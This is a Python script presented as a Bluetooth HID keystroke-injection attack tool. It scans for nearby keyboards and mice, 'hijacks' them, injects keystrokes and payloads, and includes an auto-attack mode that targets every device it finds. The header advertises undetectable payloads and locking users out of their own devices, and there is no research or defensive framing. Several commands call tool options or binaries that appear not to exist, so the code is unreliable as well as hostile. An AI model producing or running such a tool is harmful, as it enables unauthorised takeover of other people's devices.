import argparse
import os
import time
from scapy.all import *

# -------------------------------------------
# Advanced Bluetooth HID Keystroke Injection
# -------------------------------------------
# Features:
# - Hijacks BLE HID devices using Crazyradio PA & nRF52840
# - Injects keystrokes remotely using BlueDucky scripts
# - Deploys fully undetectable payloads on Bluetooth keyboards & mice
# - Can hijack and lock out users from their own devices
# - Supports remote execution of commands via Bluetooth HID
# - Automated attack chaining & target profiling
#
# Requirements:
# - Crazyradio PA / nRF52840 Dongle
# - Python 3.x
# - btlejack, hcitool, l2ping (for BLE injection & keystroke hijacking)
# - BlueDucky payload scripts
#
# Usage:
# 1. Scan for Bluetooth HID devices:
#    python bt_hid_inject.py --scan
# 2. Hijack a Bluetooth keyboard/mouse:
#    python bt_hid_inject.py --hijack XX:XX:XX:XX:XX:XX
# 3. Inject keystrokes remotely:
#    python bt_hid_inject.py --inject "Hello World" --target XX:XX:XX:XX:XX:XX
# 4. Deploy full BlueDucky payload remotely:
#    python bt_hid_inject.py --deploy payload.txt --target XX:XX:XX:XX:XX:XX
# 5. Enable automated attack chaining:
#    python bt_hid_inject.py --auto-attack
# -------------------------------------------

def scan_bluetooth():
    """Scans for nearby Bluetooth HID devices."""
    print("[+] Scanning for Bluetooth HID devices...")
    os.system("hcitool scan > bt_hid_scan_results.txt")
    os.system("hcitool lescan --passive > ble_hid_scan_results.txt & sleep 10; pkill --signal SIGINT hcitool")
    print("[✔] Scan complete. Results saved to bt_hid_scan_results.txt & ble_hid_scan_results.txt")

def hijack_hid(target):
    """Hijacks a Bluetooth HID device for keystroke injection."""
    print(f"[+] Hijacking Bluetooth HID device {target}...")
    os.system(f"btlejack -i 0 -t {target} -m")
    print("[✔] HID hijack complete.")

def inject_keystrokes(target, payload):
    """Injects keystrokes into a Bluetooth keyboard or mouse."""
    print(f"[+] Injecting keystrokes '{payload}' into {target}...")
    os.system(f"hcitool cc {target}; l2ping -c 1 {target}; echo '{payload}' | bt_keyboard_inject {target}")
    print("[✔] Keystrokes injected successfully.")

def deploy_payload(target, payload_file):
    """Deploys a full BlueDucky payload remotely."""
    print(f"[+] Deploying BlueDucky payload from {payload_file} to {target}...")
    os.system(f"btlejack -i 0 --inject {payload_file} --target {target}")
    print("[✔] Payload deployed successfully.")

def auto_attack():
    """Runs a sequence of keystroke injection attacks."""
    print("[+] Running automated HID attack sequence...")
    scan_bluetooth()
    with open("bt_hid_scan_results.txt", "r") as file:
        devices = file.readlines()[1:]
        for device in devices:
            mac = device.split()[0]
            print(f"[*] Attacking {mac}...")
            hijack_hid(mac)
            inject_keystrokes(mac, "whoami")
            deploy_payload(mac, "payload.txt")
    print("[✔] Automated attack sequence complete.")

def main():
    parser = argparse.ArgumentParser(description="Advanced Bluetooth HID Keystroke Injection Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for Bluetooth HID devices")
    parser.add_argument("--hijack", type=str, help="Hijack a Bluetooth HID device")
    parser.add_argument("--inject", type=str, help="Inject keystrokes into a Bluetooth HID device")
    parser.add_argument("--target", type=str, help="Specify target device MAC address")
    parser.add_argument("--deploy", type=str, help="Deploy a BlueDucky payload remotely")
    parser.add_argument("--auto-attack", action='store_true', help="Enable automated attack chaining")
    args = parser.parse_args()

    if args.scan:
        scan_bluetooth()
    elif args.hijack:
        hijack_hid(args.hijack)
    elif args.inject and args.target:
        inject_keystrokes(args.target, args.inject)
    elif args.deploy and args.target:
        deploy_payload(args.target, args.deploy)
    elif args.auto_attack:
        auto_attack()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
